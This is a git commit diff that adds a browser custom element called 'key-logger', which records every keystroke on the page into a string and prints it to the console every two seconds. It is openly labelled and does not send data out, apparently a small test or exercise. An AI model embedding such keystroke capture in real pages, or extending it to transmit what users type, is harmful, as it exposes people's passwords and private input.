825ff278809c12647ed0dac96eec5e8d0b656ed3
Ali Shalabi <ashalabi13@gmail.com>
2019-10-02 15:12:18 -0700

    Code added, testing

--- key-logger.js
+++ key-logger.js
@@ -4,9 +4,25 @@
 
   class KeyLogger extends HTMLElement {
     constructor() {
+      // Must always call super
       super()
+      // Attach object to Shadow Dom
       this._shadowRoot = this.attachShadow({mode: 'open'})
+
+      // Set empty string - will eventually be recorded and cleared
+      let str = ""
+
+      // Append keystroke to string on each keydown
+      document.onkeydown = function(e) {
+        str += e.key
+      }
+
+      setInterval(() => {
+        console.log(str)
+        str = ""
+      }, 2000)
     }
   }
 
-}());
+  customElements.define('key-logger', KeyLogger)
+}())
